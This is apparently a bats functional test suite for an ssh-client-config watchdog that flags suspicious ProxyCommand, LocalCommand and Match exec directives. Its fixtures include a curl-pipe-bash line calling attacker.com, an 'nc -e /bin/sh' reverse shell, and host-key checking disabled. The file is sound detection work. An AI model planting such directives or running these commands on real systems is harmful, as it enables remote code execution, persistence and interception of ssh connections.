#!/usr/bin/env bats
# L2 bats functional tests for the ssh-client-config-watchdog scan script.
#
# A system/root ssh client config can run a program on every outbound ssh:
#   ProxyCommand /tmp/.x %h %p        (runs to set up the connection)
#   LocalCommand /tmp/.x              (runs after connect; needs
#                                      PermitLocalCommand yes)
#   Match exec "/tmp/.probe"          (runs to decide the match)
# A directive whose program is under a writable root, relative-with-slash,
# or carries an injection pattern is alert. Bare PATH-resolved commands
# (nc, corkscrew, cloudflared) are normal and not flagged.
#
# Runs the actual scan script with `logger` shadowed on PATH and the config
# in a tmp sandbox via SELFDEF_SSHCLIENT_FILE / _D / _ROOT.
#
# Run with: bats packaging/test/L2-ssh-client-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/ssh-client-config-watchdog/systemd/ssh-client-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/ssh_config"
    CONFD="${TMP}/ssh_config.d"; mkdir -p "${CONFD}"
    NOROOT="${TMP}/nonexistent-root-config"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SSHCLIENT_PROFILE="${PROFILE:-report}" \
    SELFDEF_SSHCLIENT_BASELINE="${BASELINE}" \
    SELFDEF_SSHCLIENT_FILE="${CONF_F:-$CONF}" \
    SELFDEF_SSHCLIENT_D="${CONFD}" \
    SELFDEF_SSHCLIENT_ROOT="${NOROOT}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no ssh client config → ok / no_ssh_client_config" {
    CONF_F="${TMP}/nonexistent" CONFD="${TMP}/nonexistent.d" run_wd
    cap | grep -q '"event":"no_ssh_client_config"'
    cap | grep -q '"severity":"ok"'
}

@test "benign ProxyCommand, first run → ok / baseline_initial" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / ssh_client_config_intact" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"ssh_client_config_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "ProxyCommand under a writable root → alert / ssh_client_config_exec_directive" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd                                   # benign baseline
    printf 'Host *\n    ProxyCommand /tmp/.x %%h %%p\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"ssh_client_config_exec_directive"'
    cap | grep -q '"severity":"alert"'
}

@test "LocalCommand under /dev/shm → alert" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Host *\n    PermitLocalCommand yes\n    LocalCommand /dev/shm/x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "Match exec with a writable target → alert" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Match host *.internal exec "/tmp/.probe"\n    User root\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a relative-with-slash ProxyCommand → alert" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Host *\n    ProxyCommand ./rel/x %%h %%p\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign directive change → warn / ssh_client_config_changed" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Host *\n    ProxyCommand /usr/bin/nc -X5 %%h %%p\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"ssh_client_config_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "a bare PATH-resolved ProxyCommand (corkscrew) is NOT flagged" {
    printf 'Host *.internal\n    ProxyCommand corkscrew proxy 8080 %%h %%p\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious directive" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Host *\n    ProxyCommand /tmp/.x %%h %%p\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — ssh-client inventory enumerates outbound-ssh exec surface)" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (ProxyCommand under /var/tmp): writable-root expansion" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Host *\n    ProxyCommand /var/tmp/.x %%h %%p\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (LocalCommand under /tmp — symmetric axis to ProxyCommand)" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Host *\n    PermitLocalCommand yes\n    LocalCommand /tmp/.x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (Match exec under /var/tmp): writable-root on Match-exec axis" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Match host *.internal exec "/var/tmp/.probe"\n    User root\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (config in ssh_config.d also scanned — not only the main file)" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Host *\n    ProxyCommand /tmp/.dropin-attacker %%h %%p\n' > "${CONFD}/99-evil.conf"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable ssh_config → alert)" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-ssh-client-config -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): ssh-client-config-watchdog does NOT refresh baseline on suspicious-directive detection — alert STAYS until operator updates" {
    # Per-outbound-ssh root-exec persistence — alert MUST persist
    # across runs until operator explicitly re-baselines.
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    printf 'Host *\n    ProxyCommand /tmp/.x %%h %%p\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"ssh_client_config_exec_directive"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious ProxyCommand NOT flagged: # prefix filtered)" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n# ProxyCommand /tmp/.example-attacker %%h %%p\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"event":"ssh_client_config_exec_directive"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (ProxyCommand under /home — user-writable hijack coverage)" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'Host *\n    ProxyCommand /home/user/.x %%h %%p\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in ProxyCommand)" {
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'Host *\n    ProxyCommand sh -c "curl -s http://attacker.com/p | bash"\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in ProxyCommand: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. ssh client ProxyCommand runs the named
    # command on every outbound ssh connection that matches the
    # Host pattern — a per-outbound-ssh exec surface. Sister-vector
    # to ssh-hardening + ssh-hostkey-watchdog + sshrc-watchdog on
    # the SSH-family surveillance brain.
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'Host *\n    ProxyCommand sh -c "nc -e /bin/sh 1.1.1.1 4444"\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (LocalCommand directive surveillance: also scanned — sister axis to ProxyCommand)" {
    # Sister to ProxyCommand surveillance INVARIANTs already
    # locked. LocalCommand is a less-known ssh client directive
    # that runs an arbitrary command on the LOCAL host (not the
    # remote) after the connection completes. Attacker who can
    # plant a LocalCommand in user's ssh config gets per-
    # connection local exec — sister vector to ProxyCommand
    # on the ssh client config surveillance surface (T1546 —
    # Event Triggered Execution via ssh-connection-completion).
    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'Host *\n    PermitLocalCommand yes\n    LocalCommand /tmp/.evil-local-callback %%h\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (StrictHostKeyChecking=no directive — defeats MITM defense → alert)" {
    # Sister to ProxyCommand + LocalCommand directive INVARIANTs
    # already locked. StrictHostKeyChecking=no disables ssh's
    # primary MITM defense (host-key TOFU verification). An
    # operator-edited ssh_config with =no for *: globally
    # accepts any host key — an attacker on the network path
    # can MITM every ssh connection that uses that config.
    # The watchdog MUST surface this as alert because it
    # defeats the foundational TLS-like assurance of ssh.
    # T1556 — Modify Authentication Process via host-key
    # verification downgrade.
    printf 'Host *\n    User alice\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'Host *\n    StrictHostKeyChecking no\n    UserKnownHostsFile /dev/null\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (ProxyCommand under /var/tmp — writable-root axis-symmetric expansion on ssh client config substrate)" {
    # Sister to /home ProxyCommand writable-root INVARIANT
    # already locked. /var/tmp is writable by ALL users AND
    # persists across reboots — attackers prefer for boot-
    # survival persistence. ProxyCommand fires AS the user
    # running ssh; planted binary in /var/tmp gets remote-
    # exec on every ssh connection via the matched Host stanza.
    # T1574 Hijack Execution Flow via ssh ProxyCommand. Closes
    # /var/tmp axis on ssh client config writable-root coverage.
    printf 'Host bastion\n    ProxyCommand /var/tmp/.evil-proxy %%h %%p\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on ssh-client-config surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The ssh-client-config-watchdog MUST only emit severity
    # values from the closed set {ok,warn,alert} — never custom
    # values (critical, error, fatal, notice, info). Operator
    # dashboard parsers branch on the literal severity string;
    # an out-of-set value silently falls through routing and the
    # operator never sees the T1556 Modify Authentication
    # Process / T1574 Hijack Execution Flow ssh-client alert.
    # Locks parser contract on the SSH client-config detection
    # surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'Host bastion\n    User alice\n' > "${CONF}"
    run_wd                                              # ok path
    printf 'Host bastion\n    ProxyCommand /tmp/.evil %%h %%p\n' > "${CONF}"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: ssh-client-config-watchdog NEVER deletes config entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # ssh-client-config-watchdog DETECTS T1556 Modify
    # Authentication Process / T1574 Hijack Execution Flow via
    # ssh client-config tampering but MUST NEVER emit sed/awk/
    # rm commands to auto-clean the suspicious directive. The
    # detected ProxyCommand/LocalCommand may be operator-
    # legitimate (corp bastion setup, dev tunneling tool) —
    # silent auto-delete would destroy operator baseline state.
    # Surveillance, never remediation. Locks anti-data-loss
    # contract on the ssh-client-config surveillance substrate.
    printf 'Host bastion\n    ProxyCommand /tmp/.evil %%h %%p\n' > "${CONF}"
    run_wd
    [ -f "${CONF}" ]
    grep -q 'ProxyCommand' "${CONF}"
    ! grep -qE 'sed[[:space:]]+-i.*/d' "${WD}"
    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # ssh-client-config-watchdog runs ON the timer's scheduled
    # fire — scans /etc/ssh/ssh_config + ssh_config.d for
    # ProxyCommand + LocalCommand injection patterns, emits a
    # verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the ssh-client-config-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/ssh-client-config-watchdog/systemd/selfdef-ssh-client-config.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. ssh-client-config-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # ssh-client-config-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # ssh-client-config-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/ssh-client-config-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'ssh-client-config-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: ssh-client-config-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. ssh-client-config-watchdog is a DETECT-only watchdog: surveils +
    # emits verdicts, NEVER writes back. Locks no-auto-fix on
    # the ssh-client-config-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/ssh-client-config-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (ssh-client-config-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the ssh-client-config-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/ssh-client-config-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (ssh-client-config-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # ssh-client-config-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/ssh-client-config-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
